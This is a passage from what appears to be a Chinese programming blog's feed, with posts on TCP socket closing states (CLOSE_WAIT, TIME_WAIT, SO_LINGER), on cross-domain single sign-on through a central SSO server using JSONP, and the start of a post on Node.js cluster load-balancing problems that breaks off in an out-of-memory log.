<pre class="line-numbers language-c" data-language="c"><code class="language-c">ret <span class="token operator">=</span> <span class="token function">CS_GetConnect</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>client<span class="token punctuation">,</span>ipAddr<span class="token punctuation">,</span><span class="token number">9010</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"connected success."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">CloseSocket</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>代码片段1.1</p>
<p>基本逻辑就是，连接建立后立即关闭。其中CloseSocket函数是自定义函数，仅仅封装了在windows和linux下关闭socket的不同实现而已</p>
<pre><code>#if defined(WIN32) || defined(WIN64)
#define CloseSocket(fd) do&#123; closesocket(fd);/* shutdown(fd, 2);*/ &#125;while(0)
#else
#define CloseSocket(fd) do&#123; close(fd); /*shutdown(fd,2);*/ &#125;while(0)
#endif
</code></pre>
<p>代码片段1.2</p>
<p><img src="https://gitlab.com/yunnysunny/socket_close/-/raw/master/doc/close1.png" alt="socket的关闭流程1"></p>
<p>图1.1 CLOSE_WAIT出现流程</p>
<p>客户端调用了CloseSocket之后，发送FIN信号到服务器端，告诉socket程序，连接已经断开。服务器端接收到FIN信号后，会将自身的TCP状态置为<code>CLOSE_WAIT</code>,同时回复 一个ACK信号给客户端，客户端接收到这个ACK信号后，自身将处于<code>FIN_WAIT_2</code>状态。</p>
<p>但是tcp是全双工的通信协议，虽然客户端关闭了连接，但是服务器端对于这个关闭动作不予理睬怎么办。对于服务器端来说，这是个不幸的消息，因为它将一直处于<code>CLOSE_WAIT</code>状态，虽然客户端已经不需要和服务器间进行通信了，但是服务器端的socket连接句柄一直得不到释放；如果老是有这种情况出现，久而久之服务器端的连接句柄就会被耗尽。对于发起关闭的客户端来说，他处于<code>FIN_WAIT_2</code>状态，如果出现服务器端一直处于<code>CLOSE_WATI</code>状态的情况，客户端并不会一直处在<code>FIN_WAIT_2</code>状态，因为这个状态有一个超时时间，这个值可以在&#x2F;etc&#x2F;sysctl.conf中进行配置。在这个文件中配置<code>net.ipv4.tcp_fin_timeout=30</code>即可保证<code>FIN_WAIT_2</code>状态最多保持30秒，超过这个时间后就进入TIME_WAIT状态（下面要讲到这个状态）。</p>
<p><strong>注意：这里socket的关闭从客户端发起，仅仅是为了举例说明，socket的关闭完全也可以从服务器端发起。比如说你写了一个爬虫程序去下载互联网上的某些web服务器上的资源的时候，某些要下载的web资源不存在，web服务器会立即关闭当前的socket连接，但是你的爬虫程序不够健壮，对于这种情况没有做处理，同样会使你的爬虫客户端处于CLOSE_WAIT状态。</strong></p>
<p>那么怎样预防SOCKET处于CLOSE_WATI状态呢，答案在这里：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">	<span class="token keyword">while</span><span class="token punctuation">(</span>true<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">memset</span><span class="token punctuation">(</span>getBuffer<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>MY_SOCKET_BUFFER_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
		Ret <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span> getBuffer<span class="token punctuation">,</span> MY_SOCKET_BUFFER_SIZE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span> Ret <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> Ret <span class="token operator">==</span> SOCKET_ERROR <span class="token punctuation">)</span> 
		<span class="token punctuation">&#123;</span>
			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"对方socket已经退出,Ret【%d】!\n"</span><span class="token punctuation">,</span>Ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
			Ret <span class="token operator">=</span> SOCKET_READE_ERROR<span class="token punctuation">;</span><span class="token comment">//接收服务器端信息失败</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>

clear<span class="token operator">:</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>getBuffer <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">free</span><span class="token punctuation">(</span>getBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
		getBuffer <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token function">closesocket</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>代码片段1.3</p>
<p>这里摘录了服务器端部分代码，注意这个recv函数，这个函数在连接建立时，会堵塞住当前代码，等有数据接收成功后才返回，返回值为接收到的字节数；但是对于连接对方socket关闭情况，它能立即感应到，并且返回0.所以对于返回0的时候，可以跳出循环，结束当前socket处理，进行一些垃圾回收工作，注意最后一句closesocket操作是很重要的，假设没有写这句话，服务器端会一直处于CLOSE_WAIT状态。如果写了这句话，那么socket的流程就会是这样的：<br><img src="https://gitlab.com/yunnysunny/socket_close/-/raw/master/doc/close2.png" alt="socket的关闭流程2"></p>
<p>图1.2 <code>TIME_WAIT</code>出现流程</p>
<h2 id="TIME-WAIT分析"><a href="#TIME-WAIT分析" class="headerlink" title="TIME_WAIT分析"></a>TIME_WAIT分析</h2><p>服务器端调用了CloseSocket操作后，会发送一个FIN信号给客户端，客户端进入<code>TIME_WAIT</code>状态，而且将维持在这个状态一段时间，这个时间也被成为2MSL(MSL是maximum segment lifetime的缩写，意指最大分节生命周期，这是IP数据包能在互联网上生存的最长时间，超过这个时间将在互联网上消失)，在这个时间段内如果客户端的发出的数据还没有被服务器端确认接收的话，可以趁这个时间等待服务端的确认消息。注意，客户端最后发出的ACK N+1消息，是一进入<code>TIME_WAIT</code>状态后就发出的，并不是在<code>TIME_WAIT</code>状态结束后发出的。如果在发送ACK N+1的时候，由于某种原因服务器端没有收到，那么服务器端会重新发送FIN N消息，这个时候如果客户端还处于<code>TIME_WAIT</code>状态的，会重新发送ACK N+1消息，否则客户端会直接发送一个RST消息，告诉服务器端socket连接已经不存在了。</p>
<p>有时，我们在使用netstat命令查看web服务器端的tcp状态的时候，会发现有成千上万的连接句柄处在<code>TIME_WAIT</code>状态。web服务器的socket连接一般都是服务器端主动关闭的，当web服务器的并发访问量过大的时候，由于web服务器大多情况下是短连接，socket句柄的生命周期比较短，于是乎就出现了大量的句柄堵在<code>TIME_WAIT</code>状态，等待系统回收的情况。如果这种情况太过频繁，又由于操作系统本身的连接数就有限，势必会影响正常的socket连接的建立。在linux下对于这种情况倒是有解救措施，方法就是修改&#x2F;etc&#x2F;sysctl.conf文件，保证里面含有以下三行配置：</p>
<pre><code>#表示开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认为0，表示关闭  
net.ipv4.tcp_tw_reuse = 1  
#表示开启TCP连接中TIME-WAIT sockets的快速回收，默认为0，表示关闭  
net.ipv4.tcp_tw_recycle = 1  
#表示系统同时保持TIME_WAIT的最大数量，如果超过这个数字，
#TIME_WAIT将立刻被清除并打印警告信息。默认为180000，改为5000。
net.ipv4.tcp_max_tw_buckets = 5000
</code></pre>
<p>配置型 2.1</p>
<p>关于重用<code>TIME_WAIT</code>状态的句柄的操作，也可以在代码中设置：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> on <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>socketfd<span class="token comment">/*socket句柄*/</span><span class="token punctuation">,</span>SOL_SOCKET<span class="token punctuation">,</span>SO_REUSEADDR<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>on<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>on<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> ERROR_SET_REUSE_ADDR<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>代码片段2.1</p>
<p>如果在代码中设置了关于重用的操作，程序中将使用代码中设置的选项决定重用或者不重用，&#x2F;etc&#x2F;sysctl.conf中<code>net.ipv4.tcp_tw_reuse</code>中的设置将不再其作用。</p>
<p>当然这样设置是有悖TCP的设计标准的，因为处于<code>TIME_WAIT</code>状态的TCP连接，是有其存在的积极作用的，前面已经介绍过。假设客户端的ACK N+1信号发送失败，服务器端在1MSL时间过后会重发FIN N信号，而此时客户端重用了之前关闭的连接句柄建立了新的连接，但是此时就会收到一个FIN信号，导致自己被莫名其妙关闭。</p>
<p>一般<code>TIME_WAIT</code>会维持在2MSL（linux下1MSL默认为30秒）时间，但是这个时间可以通过代码修改：</p>
<pre><code>struct linger so_linger;
so_linger.l_onoff = 1;
so_linger.l_linger = 10;
if (setsockopt(socketfd,SOL_SOCKET,SO_LINGER,(char *)&amp;so_linger,sizeof(struct linger)))
&#123;
    return ERROR_SET_LINGER;
&#125;
</code></pre>
<p>代码片段2.2</p>
<p>这里代码将<code>TIME_WAIT</code>的时间设置为10秒（在BSD系统中，将会是0.01*10s）。TCP中的<code>TIME_WAIT</code>机制使得socket程序可以“优雅”的关闭，如果你想你的程序更优雅，最好不要设置<code>TIME_WAIT</code>的停留时间，让老的tcp数据包在合理的时间内自生自灭。当然对于<code>SO_LINGER</code>参数，它不仅仅能够自定义<code>TIME_WAIT</code>状态的时间，还能够将TCP的四次挥手直接禁用掉，假设对于so_linger结构体变量的设置是这个样子的：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">so_linger<span class="token punctuation">.</span>l_onoff <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
so_linger<span class="token punctuation">.</span>l_linger <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>如果客户端的socket是这么设置的那么socket的关闭流程就直接是这个样子了：<br><img src="https://gitlab.com/yunnysunny/socket_close/-/raw/master/doc/close3.png" alt="socket的关闭流程3"></p>
<p>图2.1 RST关闭流程</p>
<p>这相当于客户端直接告诉服务器端，我这边异常终止了，对于我稍后给出的所有数据包你都可以丢弃掉。服务器端如果接受到这种RST消息，会直接把对应的socket句柄回收掉。有一些socket程序不想让TCP出现<code>TIME_WAIT</code>状态，会选择直接使用RST方式关闭socket，以保证socket句柄在最短的时间内得到回收，当然前提是接受有可能被丢弃老的数据包这种情况的出现。如果socket通信的前后数据包的关联性不是很强的话，换句话说每次通信都是一个单独的事务，那么可以考虑直接发送RST信号来快速关闭连接。</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>1.文中提到的修改&#x2F;etc&#x2F;sysctl.conf文件的情况，修改完成之后需要运行<code>/sbin/sysctl -p</code>后才能生效。<br>2.图1中发送完FIN M信号后，被动关闭端的socket程序中输入流会接收到一个EOF标示，是在C代码中处理时recv函数返回0代表对方关闭，在java代码中会在InputStream的read函数中接收到-1：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Socket</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//,9090</span>
	<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
		client<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>
			<span class="token keyword">new</span> <span class="token class-name">InetSocketAddress</span><span class="token punctuation">(</span><span class="token string">"192.168.56.101"</span><span class="token punctuation">,</span><span class="token number">9090</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		
		<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>				
			<span class="token keyword">int</span> c <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果对方socket关闭，read函数返回-1</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>

			<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
				<span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>					
			<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		e2<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
			client<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>代码片段3.1</p>
<p>3.如果主动关闭方已经发起了关闭的FIN信号，被动关闭方不予理睬，依然往主动关闭方发送数据，那么主动关闭方会直接返回RST新号，连接双方的句柄就被双方的操作系统回收，如果此时双方的路由节点之前还存在未到达的数据，将会被丢弃掉。</p>
<p>4.通信的过程中，socket双发中有一方的进程意外退出，则这一方将向其对应的另一方发送RST消息，所有双发建立的连接将会被回收，未接收完的消息就会被丢弃。</p>
]]></content>
      <categories>
        <category>Network</category>
        <category>TCP</category>
      </categories>
  </entry>
  <entry>
    <title>跨越万水千山认识你,跨根域的单点登陆设计</title>
    <url>/posts//the-design-of-sso-between-diffrent-domain/</url>
    <content><![CDATA[<p>现在我们越来越喜欢使用第三方账号（QQ、微博）来登陆各种网站，比如说只要你的 QQ 在线，点几下鼠标就可以登陆一个第三方网站，最多让你在第一次登陆的时候补充一下手机号或者邮箱地址，下次就可以直接使用 QQ登陆了。但是，我们这篇文章并不是解释这种登陆模式的，这种登陆模式用户体系其实在 QQ 和 微博获取，如果需要单点登陆的网站的用户数据本来就拿到，就不用费这么都周折了，比如说下面这种。</p>
<blockquote>
<p>本教程链接 <a href="https://blog.whyun.com/posts//the-design-of-sso-between-diffrent-domain/">https://blog.whyun.com/posts//the-design-of-sso-between-diffrent-domain/</a> ，转载请注明出处</p>
</blockquote>
<p>想想这种情况，假设你是一个电商网站，叫某宝，后来你的业务发展了，你又做了一个子产品网站，叫某猫，你肯定想用户登陆一次，就能畅游两个网站。也许你会想，某宝和某猫可以做成挂在同一个一级域名下的二级域名，比如说 tao.xxx.com 和 mao.xxx.com，然后登陆的时候 cookie 写入 xxx.com，就能实现 session 共享了。很遗憾的告诉你，某宝和某猫是两个平行的子公司，根本就不会共用一个一级域名。我们姑且将这两个公司的域名记为 tao.com 和 mao.com 。</p>
<p>用户在一个节点登陆完成之后，我们在前端需要将登陆凭证写入 cookie ，这样用户再在这个节点上发起请求的时候，会把 cookie 带入请求头发给这个节点的服务器端，服务器端就能判断用户是否在线了。不过现在用户在节点 A 登陆后，根本就没法将 cookie 写入 B 节点，好像问题陷入了死结。我们再来从头分析一下，问题的症结是 cookie 不能跨一级域名写入，那么我们就让它写入一个节点好了，解决问题的关键就是增加一个中心节点，专门用来记录 cookie，哪个节点需要读取 cookie，就从这个中心节点读取即可了。</p>
<p><img src="/images/sso.png" alt="sso登陆时序图"></p>
<p>关键的一个步骤，就是第 2 步，jsonp 的原理其实就是生成一个异域的 script 标签，但是这里请求 sso.com 的时候，会在请求上带入 sso.com 本身的 cookie！然后我们再在 JavaScript 代码中将这个 cookie 信息赋值给 js 变量，这样 tao.com 就能通过 js 得到 sso.com 的 cookie 了。</p>
<p>为了简化教程，这里只给出 tao.com 前端代码：</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>首页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>stylesheet<span class="token punctuation">'</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>/stylesheets/style.css<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>首页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js-data-hidden<span class="token punctuation">"</span></span> <span class="token attr-name">js-domain</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;%=domain%><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://upcdn.b0.upaiyun.com/libs/jquery/jquery-2.0.3.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
        <span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">var</span> $data <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#js-data-hidden'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">var</span> domain <span class="token operator">=</span> $data<span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'js-domain'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">var</span> redirect <span class="token operator">=</span> <span class="token function">encodeURIComponent</span> <span class="token punctuation">(</span><span class="token string">'http://'</span> <span class="token operator">+</span> domain<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">var</span> ssoBaseUrl <span class="token operator">=</span> <span class="token string">'http://sso.com'</span><span class="token punctuation">;</span>
            $<span class="token punctuation">.</span><span class="token function">getJSON</span><span class="token punctuation">(</span>ssoBaseUrl <span class="token operator">+</span> <span class="token string">'/get-ticket?callback=?'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>ticket<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">return</span> $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/get-user-info?ticket='</span><span class="token operator">+</span>data<span class="token punctuation">.</span>ticket<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                location<span class="token punctuation">.</span>href <span class="token operator">=</span> ssoBaseUrl <span class="token operator">+</span> <span class="token string">'/login?redirect='</span> <span class="token operator">+</span> redirect<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span>code <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>msg <span class="token operator">||</span> <span class="token string">'逻辑错误'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'/user-backend'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'网络错误'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.1 tao.com 登陆状态获取</strong></p>
<p>这里我们用 ticket 来表示登陆成功之后写入 sso.com 的 cookie 的变量。上面代码的逻辑还是比较清晰的，首先通过 jsonp 获取 ticket ：如果获取到了就到了就在 tao.com 的后端，通过 ticket 查询出对应的用户 ID 回来，然后将登陆用户数据写入 tao.com 本身的 session中；如果没有获取到 ticket，就跳转到 sso.com 完成登陆，并生产成 ticket，登陆完成后再跳转会 tao.com。</p>
<blockquote>
<p>本教程关联的完整代码，参见这里 <a href="https://gitlab.com/yunnysunny/sso-demo">https://gitlab.com/yunnysunny/sso-demo</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Engineering Design</category>
      </categories>
  </entry>
  <entry>
    <title>Node 的缺陷</title>
    <url>/posts/the-defect-of-node/</url>
    <content><![CDATA[<p>提起 Node.js ，大家可能认为对其的优劣已经分辨的很清楚：由于其默认单线程，所以不适合做计算密集型操作；由于其异步 IO 特性，所以对于 IO 处理比较友好。但这其实是一种误解，当 IO 并发到一定的量级，一样会损耗 CPU 资源。在 Node.js 引以为豪的 IO 处理方面，依然有其做的不完善的地方，本篇文章就给大家一一解密。 </p>
<h2 id="1-问题"><a href="#1-问题" class="headerlink" title="1. 问题"></a>1. 问题</h2><h3 id="1-1-负载均衡问题"><a href="#1-1-负载均衡问题" class="headerlink" title="1.1 负载均衡问题"></a>1.1 负载均衡问题</h3><p>Node.js 在起步之初，语言层面只能利用单进程，后来官方引入了 <a href="https://nodejs.org/dist/latest-v16.x/docs/api/cluster.html">Cluster</a> 模块来解决这个问题。但是在操作系统中一个端口号默认只能被一个句柄监听，也就是说不经过特殊设置，服务监听端口只能调用 listen 函数一次。但是我们现在使用了 Cluster 之后，要求每个工作进程都可以接受客户端的请求，该如何实现呢？</p>
<p>（在 Linux 下）Node 底层会采取两种策略，一种是在主进程监听端口完成之后，顺便完成 socket 的 accept 操作，然后将接收的 socket 句柄通过进程间通信平均分发到工作进程中去；一种是主进程绑定端口完成之后，直接把这个句柄发送给工作进程，每个工作进程都自己做监听 和 accept 操作。前者的负载均衡由用户端代码控制，后者的负载均衡由操作系统控制，但是后者的负载均衡的分配会出现不均匀的情况，并且会因为惊群效应，导致性能低下，所以 Node 默认使用的是第一种策略。</p>
<blockquote>
<p>这里不考虑  Windows 下的场景。</p>
</blockquote>
<p>对于第一种策略，主进程会先将接收到的 socket 放入本地数组中，然后再依次从数组头部中截取元素，发送到某一个工作进程中。初步看上去这个流程没有问题，特别是你的请求 QPS 不是很大的时候。但是一旦并发请求量过大，就会出现 socket 句柄在前面提到的本地数组中堆积的现象，数组长度太大的话对于数组的截取操作就变成了一个慢操作，引起主进程 CPU 升高，主进程 CPU 升高会进一步削弱其给工作进程分发 socket 句柄的能力，从而导致本地数组进一步增大，如此恶行循环，最终会导致主进程的老生代内存被撑爆，触发 OOM，主进程被迫退出。</p>
<blockquote>
<p>默认策略性能低下问题，笔者已经给官方提交了 issue <a href="https://github.com/nodejs/node/issues/37343">#37343</a> 。</p>
</blockquote>
<blockquote>
<p>如果你的主进程使用 PM2，并且因为 OOM 而退出，会在 ~&#x2F;.pm2&#x2F;pm2.log 找到类似日志：</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;--- Last few GCs ---&gt;

[65994:0x3c57eb0] 20952120 ms: Scavenge 874.5 (894.1) -&gt; 858.5 (894.1) MB, 0.9 &#x2F; 0.0 ms  (average mu &#x3D; 0.995, current mu &#x3D; 0.993) allocation failure 
[65994:0x3c57eb0] 20952493 ms: Scavenge 874.5 (894.1) -&gt; 858.5 (894.1) MB, 1.4 &#x2F; 0.0 ms  (average mu &#x3D; 0.995, current mu &#x3D; 0.993) allocation failure 
[65994:0x3c57eb0] 20952859 ms: Scavenge 874.5 (894.1) -&gt; 858.5 (894.1) MB, 0.9 &#x2F; 0.0 ms  (average mu &#x3D; 0.995, current mu &#x3D; 0.993) allocation failure 


&lt;--- JS stacktrace ---&gt;

